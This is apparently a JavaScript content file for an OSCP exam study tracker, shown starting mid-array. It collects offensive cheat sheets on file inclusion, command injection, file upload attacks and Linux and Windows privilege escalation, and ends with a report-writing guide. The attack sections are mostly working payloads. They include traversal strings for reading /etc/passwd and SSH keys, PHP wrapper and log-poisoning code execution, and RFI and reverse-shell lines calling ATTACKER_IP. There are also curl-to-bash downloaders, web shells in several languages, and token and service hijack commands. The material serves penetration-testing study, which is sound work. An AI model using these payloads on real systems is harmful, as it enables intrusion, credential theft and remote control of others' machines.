        code: "# Basic traversal (Linux)\n?page=../../../../etc/passwd\n?file=....//....//....//etc/passwd\n\n# Basic traversal (Windows)\n?page=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n?page=....\\\\....\\\\....\\\\windows\\win.ini\n\n# Null byte bypass (PHP < 5.3.4)\n?page=../../../../etc/passwd%00\n?page=../../../../etc/passwd%00.php\n\n# Double URL encoding\n?page=%252e%252e%252f%252e%252e%252fetc/passwd\n\n# Filter bypass variations\n?page=....//....//....//etc/passwd   # Double-dot stripping bypass\n?page=..%2f..%2f..%2fetc/passwd      # URL-encoded slashes\n?page=..%252f..%252f..%252fetc/passwd  # Double-encoded"
      },
      {
        heading: "Key Files to Read",
        level: 2,
        code: "# ── Linux ──\n/etc/passwd              # User accounts — always test first\n/etc/shadow              # Password hashes (usually root-only)\n/etc/hostname            # Machine name\n/etc/hosts               # Internal hostnames/IPs\n/home/USER/.ssh/id_rsa   # SSH private keys\n/home/USER/.bash_history # Command history\n/proc/self/environ       # Environment variables (may contain creds)\n/proc/self/cmdline       # Running process command line\n/var/log/apache2/access.log  # Apache logs (for log poisoning)\n/var/log/auth.log        # SSH/auth logs\n\n# ── Windows ──\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\Windows\\win.ini\nC:\\inetpub\\wwwroot\\web.config\nC:\\Users\\Administrator\\.ssh\\id_rsa\nC:\\xampp\\apache\\conf\\httpd.conf\nC:\\xampp\\passwords.txt"
      },
      {
        heading: "PHP Wrappers (LFI to RCE)",
        level: 2,
        content: "PHP stream wrappers can convert LFI into source code disclosure or direct code execution. These are critical for OSCP — especially php://filter and data://.",
        code: "# Read PHP source code (base64-encoded to avoid execution)\n?page=php://filter/convert.base64-encode/resource=index.php\n?page=php://filter/convert.base64-encode/resource=config.php\n\n# Decode the output\necho 'BASE64_OUTPUT' | base64 -d\n\n# Direct code execution via data:// (requires allow_url_include=On)\n?page=data://text/plain,<?php system('id'); ?>\n?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\n\n# Code execution via php://input (POST body becomes code)\ncurl -X POST 'http://TARGET/page.php?page=php://input' -d '<?php system(\"id\"); ?>'\n\n# Expect wrapper (if expect:// enabled)\n?page=expect://id\n?page=expect://whoami"
      },
      {
        heading: "Log Poisoning (LFI to RCE)",
        level: 2,
        content: "If you can read log files via LFI, you can inject PHP code into the log and then include the log file to execute it. Common targets: Apache access.log, SSH auth.log, mail.log.",
        numbered: true,
        list: [
          "Confirm you can read the log file: ?page=../../../../var/log/apache2/access.log",
          "Inject PHP code into the log — send a request with PHP in the User-Agent header: curl -A '<?php system($_GET[\"cmd\"]); ?>' http://TARGET/",
          "Include the poisoned log file: ?page=../../../../var/log/apache2/access.log&cmd=id",
          "If successful, upgrade to a reverse shell via the cmd parameter",
          "SSH log poisoning: ssh '<?php system($_GET[\"cmd\"]); ?>'@TARGET — then include /var/log/auth.log"
        ]
      },
      {
        heading: "Remote File Inclusion (RFI)",
        level: 2,
        content: "RFI allows including a file from an external URL. Requires allow_url_include=On in PHP (disabled by default in modern versions). If available, it gives immediate code execution.",
        code: "# Host a PHP payload on your attack machine\n# Create shell.php: <?php system($_GET['cmd']); ?>\npython3 -m http.server 80\n\n# Include remote file\n?page=http://ATTACKER_IP/shell.php\n?page=http://ATTACKER_IP/shell.php&cmd=id\n\n# Bypass file extension appending\n?page=http://ATTACKER_IP/shell.php%00          # Null byte (PHP < 5.3.4)\n?page=http://ATTACKER_IP/shell.php?            # Query string truncation\n?page=http://ATTACKER_IP/shell               # No extension needed if include has none"
      },
      {
        heading: "LFI/RFI Methodology",
        level: 2,
        numbered: true,
        list: [
          "Identify parameters that reference files (page=, file=, template=, lang=, include=)",
          "Test basic path traversal: ../../../../etc/passwd",
          "Try bypass techniques: null byte, double encoding, double-dot stripping",
          "If LFI confirmed: read sensitive files (config files, SSH keys, /etc/shadow)",
          "Try PHP wrappers: php://filter to read source code, data:// for direct execution",
          "Try log poisoning: read access.log or auth.log, inject PHP via User-Agent or SSH username",
          "Test for RFI: include a file from your HTTP server",
          "Escalate to reverse shell once code execution is achieved",
          "Document: vulnerable parameter, payload, files read, RCE method"
        ]
      }
    ]
  },

  {
    id: "command_injection",
    title: "Command Injection",
    category: "Web Exploitation",
    icon: "⚡",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "Command Injection (OS Command Injection) occurs when an application passes user input to a system shell command without sanitization. The attacker can append or chain their own OS commands.\n\nCommon in web apps that call system utilities — ping, nslookup, traceroute, file converters, PDF generators, backup scripts, or any feature that executes a system binary."
      },
      {
        heading: "Detection Payloads",
        level: 2,
        content: "Test every input that might trigger a server-side command. Try each metacharacter — different ones work depending on the host OS and how the command is constructed.",
        code: "# Semicolon — command separator (Linux)\n; id\n; whoami\n\n# Pipe — pipe output to next command\n| id\n| whoami\n\n# AND operators\n&& id\n& id\n\n# Newline\n%0a id\n%0a whoami\n\n# Backtick substitution\n`id`\n`whoami`\n\n# Dollar substitution (bash)\n$(id)\n$(whoami)\n\n# Windows-specific\n& whoami\n| whoami\n%0a whoami\n\n# Blind detection (time-based)\n; sleep 5\n| sleep 5\n& ping -c 5 127.0.0.1\n& timeout 5"
      },
      {
        heading: "Blind Command Injection",
        level: 2,
        content: "When command output is not displayed, confirm injection via time delays, DNS lookups, or out-of-band HTTP callbacks.",
        code: "# Time-based confirmation\n; sleep 5                                      # Linux\n& ping -n 5 127.0.0.1                          # Windows\n| ping -c 5 127.0.0.1                          # Linux\n\n# Out-of-band: DNS callback (use Burp Collaborator or interactsh)\n; nslookup BURP_COLLABORATOR_DOMAIN\n$(nslookup BURP_COLLABORATOR_DOMAIN)\n\n# Out-of-band: HTTP callback\n; curl http://ATTACKER_IP/proof\n; wget http://ATTACKER_IP/proof\n| curl http://ATTACKER_IP:8000/$(whoami)\n\n# File write confirmation\n; echo 'INJECTED' > /tmp/proof.txt\n; ls /tmp/proof.txt | curl http://ATTACKER_IP -d @-"
      },
      {
        heading: "Filter Bypass Techniques",
        level: 2,
        content: "Applications may filter spaces, specific commands, or special characters. Use these bypass techniques.",
        code: "# Space bypass\n;{id}                          # Brace expansion\n;cat</etc/passwd               # Input redirection as separator\n;cat${IFS}/etc/passwd           # $IFS = Internal Field Separator (space/tab/newline)\n;cat$IFS/etc/passwd\nX=$'cat\\x20/etc/passwd'&&$X    # Hex-encoded space\n\n# Keyword bypass (if 'cat' is blocked)\n;tac /etc/passwd               # Reverse cat\n;nl /etc/passwd                # Number lines\n;head /etc/passwd\n;less /etc/passwd\n;sort /etc/passwd\n;c'a't /etc/passwd             # Quote insertion\n;c\\at /etc/passwd              # Backslash insertion\n;/bin/c?t /etc/passwd          # Wildcard\n\n# Semicolon bypass\n%0a id                         # Newline URL-encoded\n%0d%0a id                      # CRLF"
      },
      {
        heading: "Escalation to Reverse Shell",
        level: 2,
        content: "Once command execution is confirmed, escalate to an interactive reverse shell.",
        code: "# Bash reverse shell (URL-encode special chars if needed)\n; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'\n\n# URL-encoded version (for web parameters)\n%3B%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F443%200%3E%261%27\n\n# Python reverse shell\n; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'\n\n# PowerShell (Windows)\n| powershell -e ENCODED_PAYLOAD\n\n# Download and execute\n; curl http://ATTACKER_IP/shell.sh | bash\n; wget http://ATTACKER_IP/shell.sh -O /tmp/s.sh && bash /tmp/s.sh"
      },
      {
        heading: "Command Injection Methodology",
        level: 2,
        numbered: true,
        list: [
          "Identify inputs that may trigger system commands (ping, lookup, file operations, etc.)",
          "Test with each metacharacter: ;  |  &&  &  \\n  `cmd`  $(cmd)",
          "Observe response: command output? error message? time delay?",
          "If blind: use sleep/ping for timing, or DNS/HTTP callbacks for out-of-band",
          "If filters exist: try space bypass ($IFS), keyword bypass (quotes, backslash, wildcards)",
          "Confirm execution with id/whoami and document the exact payload",
          "Escalate to reverse shell",
          "Document: vulnerable parameter, working payload, shell obtained"
        ]
      }
    ]
  },

  {
    id: "file_upload_attacks",
    title: "File Upload Vulnerabilities",
    category: "Web Exploitation",
    icon: "📤",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "File upload vulnerabilities occur when an application allows uploading files without sufficient validation of file type, content, or storage location. Uploading a web shell (PHP, ASPX, JSP) to an executable directory gives immediate code execution.\n\nThis is a high-value attack in OSCP — many exam machines feature an upload function that can be abused."
      },
      {
        heading: "Web Shell Payloads",
        level: 2,
        code: "# ── PHP web shell (most common) ──\n# Simple one-liner\n<?php system($_GET['cmd']); ?>\n\n# More robust\n<?php echo '<pre>'.shell_exec($_REQUEST['cmd']).'</pre>'; ?>\n\n# ── ASP / ASPX web shell ──\n<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<% Process.Start(new ProcessStartInfo(\"cmd.exe\",\"/c \" + Request[\"cmd\"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd() %>\n\n# ── JSP web shell ──\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
      },
      {
        heading: "Extension Bypass Techniques",
        level: 2,
        content: "Applications often filter by file extension. These bypasses exploit incomplete or flawed validation logic.",
        code: "# Case variation\nshell.pHp\nshell.Php\nshell.PHP\n\n# Double extension\nshell.php.jpg\nshell.jpg.php\nshell.php.png\n\n# Alternative PHP extensions\nshell.php3\nshell.php4\nshell.php5\nshell.php7\nshell.phtml\nshell.phar\nshell.phps\nshell.pgif\n\n# Null byte (older systems)\nshell.php%00.jpg\nshell.php\\x00.jpg\n\n# Semicolon / special chars (IIS)\nshell.asp;.jpg\nshell.aspx;.jpg\n\n# .htaccess upload (if allowed)\n# Upload .htaccess with: AddType application/x-httpd-php .jpg\n# Then upload shell.jpg (will be executed as PHP)"
      },
      {
        heading: "Content-Type & Magic Bytes Bypass",
        level: 2,
        content: "Some applications check the MIME type (Content-Type header) or the file's magic bytes (file signature). Both can be spoofed.",
        code: "# ── Content-Type bypass (change in Burp Repeater) ──\n# Change: Content-Type: application/x-php\n# To:     Content-Type: image/jpeg\n# Or:     Content-Type: image/png\n\n# ── Magic bytes bypass ──\n# Prepend valid image header to PHP shell\n# GIF magic bytes:\nGIF89a\n<?php system($_GET['cmd']); ?>\n\n# PNG magic bytes (hex): 89 50 4E 47 0D 0A 1A 0A\n# JPEG magic bytes (hex): FF D8 FF E0\n\n# Create with hex editor or:\nprintf '\\x89PNG\\r\\n\\x1a\\n' > shell.php.png\necho '<?php system($_GET[\"cmd\"]); ?>' >> shell.php.png\n\n# Polyglot: embed PHP in actual image EXIF\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg\nmv image.jpg shell.php.jpg"
      },
      {
        heading: "Server-Specific Upload Paths",
        level: 2,
        code: "# Common upload/writable directories to check\n/uploads/\n/upload/\n/images/\n/img/\n/files/\n/media/\n/assets/\n/tmp/\n/var/www/html/uploads/\n\n# After uploading shell.php, trigger it:\ncurl 'http://TARGET/uploads/shell.php?cmd=id'\ncurl 'http://TARGET/uploads/shell.php?cmd=whoami'"
      },
      {
        heading: "File Upload Methodology",
        level: 2,
        numbered: true,
        list: [
          "Identify file upload functionality (profile picture, document upload, import, etc.)",
          "Upload a legitimate file to understand the normal behavior (where it's stored, URL structure)",
          "Upload a web shell with the native extension (.php, .aspx, .jsp) — it may just work",
          "If blocked: try extension bypasses (double extension, alternative extensions, case variation)",
          "If Content-Type checked: intercept in Burp, change to image/jpeg or image/png",
          "If magic bytes checked: prepend GIF89a or valid image header to the shell",
          "If filename is randomized: check response for the new filename or brute-force the upload directory",
          "Upload .htaccess to make .jpg files execute as PHP (Apache-specific)",
          "Trigger the uploaded web shell and confirm execution with id/whoami",
          "Escalate to reverse shell via the web shell parameter"
        ]
      }
    ]
  },

  {
    id: "linux_privesc_methodology",
    title: "Linux Privilege Escalation Methodology",
    category: "Post-Exploitation",
    icon: "🐧",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "Linux privilege escalation is about finding a misconfiguration, vulnerability, or credential that lets you go from a low-privilege shell to root. The OSCP exam expects you to know manual techniques — automated tools help enumerate, but you must understand what they find."
      },
      {
        heading: "Enumeration-First Mindset",
        level: 2,
        content: "Run automated tools (LinPEAS, linEnum) first for a broad sweep, then manually investigate the highlighted findings. The most common privesc vectors in roughly priority order:",
        numbered: true,
        list: [
          "Sudo misconfigurations — sudo -l is always the first command. Check GTFOBins for every binary listed.",
          "SUID/SGID binaries — find / -perm -4000 2>/dev/null. Cross-reference with GTFOBins.",
          "Cron jobs — writable cron scripts, wildcard injection, PATH hijacking in cron.",
          "Writable files & directories — /etc/passwd writable? Config files with creds? Writable scripts run by root?",
          "Capabilities — getcap -r / 2>/dev/null. cap_setuid on python/perl = instant root.",
          "Kernel exploits — uname -a, check for DirtyPipe, DirtyCow, PwnKit by kernel version.",
          "NFS no_root_squash — mount and create SUID binary.",
          "Docker/LXD group membership — abuse container privileges to access host filesystem.",
          "Credentials — config files, history files, SSH keys, database creds, environment variables.",
          "PATH hijacking — if a SUID/cron script calls a command without full path."
        ]
      },
      {
        heading: "GTFOBins Decision Tree",
        level: 2,
        content: "GTFOBins (https://gtfobins.github.io/) is the definitive reference for abusing Linux binaries. When you find a binary via sudo -l or SUID, check GTFOBins for:\n\n• Sudo — Can the binary be abused with sudo to spawn a root shell?\n• SUID — Does the SUID version allow file read/write/shell?\n• Capabilities — Does cap_setuid allow UID manipulation?\n• File read/write — Can it read /etc/shadow or write to /etc/passwd?\n\nAlways check: the binary name, its flags, and whether NOPASSWD is set."
      },
      {
        heading: "Quick Win Checklist",
        level: 2,
        code: "# Always run first\nsudo -l                              # What can I run as root?\nid                                   # Am I in docker/lxd/disk group?\ncat /etc/os-release                  # OS version for kernel exploits\nuname -r                             # Kernel version\n\n# SUID/Capabilities\nfind / -perm -4000 2>/dev/null       # SUID binaries\nfind / -perm -2000 2>/dev/null       # SGID binaries\ngetcap -r / 2>/dev/null              # Capabilities\n\n# Cron & Scheduled Tasks\ncat /etc/crontab\nls -la /etc/cron.*\nsystemctl list-timers\n\n# Writable files\nfind / -writable -type f 2>/dev/null | grep -v proc\nls -la /etc/passwd                   # Writable = game over\n\n# Credentials\ngrep -ri 'password\\|passwd\\|pass=' /etc/ /opt/ /var/www/ 2>/dev/null\nfind / -name '*.kdbx' 2>/dev/null    # KeePass databases\nfind / -name 'id_rsa' 2>/dev/null    # SSH keys\ncat ~/.bash_history"
      },
      {
        heading: "Methodology Flow",
        level: 2,
        numbered: true,
        list: [
          "Stabilize shell (python3 -c 'import pty;pty.spawn(\"/bin/bash\")' → Ctrl+Z → stty raw -echo;fg)",
          "Run sudo -l immediately — check every entry against GTFOBins",
          "Run LinPEAS/linEnum for full automated sweep",
          "Check SUID binaries and capabilities against GTFOBins",
          "Inspect cron jobs for writable scripts or wildcard injection opportunities",
          "Search for credentials in config files, history, environment variables, database configs",
          "Check for writable /etc/passwd (add root-equivalent user) or writable scripts run by root",
          "Check group memberships (docker, lxd, disk) for container/filesystem abuse",
          "Check NFS exports for no_root_squash",
          "If nothing else works: check kernel version for known exploits (DirtyPipe, PwnKit, DirtyCow)",
          "Document the full privesc chain for your report"
        ]
      }
    ]
  },

  {
    id: "windows_privesc_methodology",
    title: "Windows Privilege Escalation Methodology",
    category: "Post-Exploitation",
    icon: "🪟",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "Windows privilege escalation focuses on misconfigured services, dangerous privileges (tokens), stored credentials, and missing patches. The OSCP exam heavily tests service-based privesc (binary hijacking, DLL hijacking, unquoted paths) and token privilege abuse."
      },
      {
        heading: "Enumeration-First Mindset",
        level: 2,
        content: "Run WinPEAS, PowerUp, or Seatbelt for a broad sweep, then manually investigate. The most common privesc vectors in roughly priority order:",
        numbered: true,
        list: [
          "Service misconfigurations — writable service binaries, DLL hijacking, unquoted service paths. Use icacls to check permissions.",
          "Token privileges — whoami /priv. SeImpersonatePrivilege = potato attacks (PrintSpoofer, GodPotato, JuicyPotato). SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnership, SeDebugPrivilege all grant paths to SYSTEM.",
          "Stored credentials — cmdkey /list, Windows Credential Manager, browser creds, DPAPI, PowerShell history, config files.",
          "AlwaysInstallElevated — if both HKLM and HKCU registry keys are set, MSI packages install as SYSTEM.",
          "Scheduled tasks — writable scripts called by Task Scheduler.",
          "Registry autorun — writable binaries in autorun registry keys execute on next login.",
          "Kernel exploits — systeminfo, check against Windows Exploit Suggester.",
          "Startup folder — writable startup folder = code execution on next admin login.",
          "Insecure file/folder permissions — writable Program Files, writable paths in PATH variable."
        ]
      },
      {
        heading: "Token Privilege Guide",
        level: 2,
        content: "whoami /priv shows your token privileges. Several dangerous privileges lead directly to SYSTEM.",
        code: "# SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege\n# → Potato attacks: use PrintSpoofer, GodPotato, or JuicyPotato\nPrintSpoofer.exe -i -c \"cmd /c whoami\"\nGodPotato.exe -cmd \"cmd /c whoami\"\nJuicyPotato.exe -l 1337 -p cmd.exe -a \"/c whoami\" -t *\n\n# SeBackupPrivilege\n# → Can read any file (SAM, SYSTEM hives)\nreg save HKLM\\SAM sam.bak\nreg save HKLM\\SYSTEM system.bak\n# Extract hashes with impacket-secretsdump -sam sam.bak -system system.bak LOCAL\n\n# SeDebugPrivilege\n# → Can inject into any process (migrate to SYSTEM process via Meterpreter)\n\n# SeTakeOwnershipPrivilege\n# → Take ownership of any file, then modify ACL and read it\ntakeown /f C:\\sensitive\\file.txt\nicacls C:\\sensitive\\file.txt /grant USER:F"
      },
      {
        heading: "Service Exploitation Guide",
        level: 2,
        content: "Windows services run as SYSTEM by default. If you can modify the service binary, its DLLs, or its path interpretation, you get SYSTEM execution.",
        code: "# Check service binary permissions\nicacls \"C:\\Program Files\\Service\\binary.exe\"\n# Look for: (F) Full Control or (M) Modify for your user/group\n\n# Service binary hijacking: replace the binary\nmove C:\\original.exe C:\\original.bak\ncopy C:\\payload.exe C:\\original.exe\nsc stop servicename\nsc start servicename     # Payload runs as SYSTEM\n\n# Unquoted service path exploitation\n# If path is: C:\\Program Files\\Some Service\\binary.exe (unquoted)\n# Windows tries: C:\\Program.exe, C:\\Program Files\\Some.exe, etc.\nwmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\"\n# Place payload at the path Windows tries first\n\n# DLL hijacking: if the service loads a missing DLL\n# Use Process Monitor to find \"NAME NOT FOUND\" DLL loads\n# Place your malicious DLL with that name in the search path"
      },
      {
        heading: "Quick Win Checklist",
        level: 2,
        code: "# Always run first\nwhoami /priv                     # Token privileges\nwhoami /groups                   # Group memberships\nnet user %USERNAME%              # Account details\nsysteminfo                       # OS version + patches\n\n# Services\nwmic service get name,pathname,startmode | findstr /i /v \"C:\\\\Windows\\\\\"\nsc qc servicename               # Service details\nicacls \"C:\\path\\to\\binary.exe\"   # Permissions\n\n# AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n# Stored credentials\ncmdkey /list                     # Saved credentials (use with runas /savecred)\nreg query HKLM /f password /t REG_SZ /s\ntype C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n\n# Scheduled tasks\nschtasks /query /fo TABLE /nh\n\n# Autorun\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      },
      {
        heading: "Methodology Flow",
        level: 2,
        numbered: true,
        list: [
          "Run whoami /priv — check for SeImpersonate, SeBackup, SeDebug, SeTakeOwnership",
          "If SeImpersonate: use PrintSpoofer/GodPotato/JuicyPotato for instant SYSTEM",
          "Run WinPEAS / PowerUp / Seatbelt for full automated enumeration",
          "Check services: unquoted paths, writable binaries (icacls), DLL hijacking",
          "Check AlwaysInstallElevated registry keys",
          "Search for stored credentials: cmdkey /list, PSReadLine history, registry, config files",
          "Check scheduled tasks for writable scripts",
          "Check autorun registry entries for writable binaries",
          "If nothing else: run Windows Exploit Suggester against systeminfo output",
          "Document the full privesc chain for your report"
        ]
      }
    ]
  },

  {
    id: "report_writing",
    title: "Penetration Test Report Writing",
    category: "Methodology",
    icon: "📝",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "The OSCP exam requires a professional penetration test report submitted within 24 hours after the exam. A poor report — even with all flags — can result in a failing grade. The report must walk the reader through your methodology step by step so that a technically competent person could reproduce every finding."
      },
      {
        heading: "Report Structure",
        level: 2,
        numbered: true,
        list: [
          "Title Page — Exam ID, your name, date, report title.",
          "Table of Contents — Auto-generated page numbers.",
          "Executive Summary — High-level overview: how many machines compromised, overall risk, key findings. Written for a non-technical audience.",
          "Methodology — Brief description of your approach: reconnaissance → enumeration → exploitation → post-exploitation → privilege escalation.",
          "Per-Machine Sections (one per target) — Each contains: service enumeration, vulnerability identification, exploitation steps, privilege escalation, proof screenshots.",
          "Appendix — Full tool output, additional evidence, wordlists used, scripts written."
        ]
      },
      {
        heading: "Per-Machine Section Template",
        level: 2,
        list: [
          "Machine IP & hostname",
          "Service Enumeration — Nmap output, interesting ports, version info",
          "Vulnerability Identification — What vulnerability was found, how it was identified, CVE number if applicable",
          "Exploitation — Exact steps to gain initial access, every command with output, screenshots of each step",
          "Lateral Movement (if applicable) — How you moved from initial foothold to other services/machines",
          "Privilege Escalation — Exact steps from low-privilege to root/SYSTEM, every command with output",
          "Post-Exploitation — proof.txt / local.txt content, whoami output, ifconfig/ipconfig output",
          "Remediation — How to fix each vulnerability (patch, config change, etc.)"
        ]
      },
      {
        heading: "Screenshot Requirements",
        level: 2,
        content: "Every step needs supporting evidence. A claim without a screenshot or command output is an unsubstantiated claim.",
        list: [
          "Nmap scan output showing open ports and versions",
          "Vulnerability identification (searchsploit output, web page showing vulnerable version, etc.)",
          "Exploitation in progress (exploit running, shell received)",
          "proof.txt contents shown via cat/type with whoami and ip addr/ipconfig in the same terminal",
          "local.txt contents (if separate from proof.txt) with same context",
          "Each intermediate step — don't skip steps that seem 'obvious'"
        ]
      },
      {
        heading: "Common Report Mistakes",
        level: 2,
        list: [
          "Missing screenshots for proof.txt — always show whoami + IP + file contents together",
          "Using Meterpreter screenshots that don't show the underlying commands",
          "Not documenting failed attempts — showing what didn't work demonstrates methodology",
          "Copy-pasting tool output without explanation — always explain what each output means",
          "Skipping enumeration documentation — even if a machine was easy, document the recon",
          "Not including remediation recommendations",
          "Submitting late — the 24-hour deadline is strict, start writing during the exam"
        ]
      },
      {
        heading: "Writing Tips",
        level: 2,
        list: [
          "Write as you go — document each machine immediately after compromising it during the exam",
          "Use a template (Obsidian, CherryTree, or this tracker's notes) to capture commands in real time",
          "Test reproducibility — can someone follow your steps exactly and get the same result?",
          "Keep language professional and objective — no slang, no editorializing",
          "Number your figures and reference them in the text",
          "Include full commands, not abbreviated ones — copy from terminal history if needed",
          "Export to PDF with consistent formatting before submission"
        ]
      }
    ]
  }
];
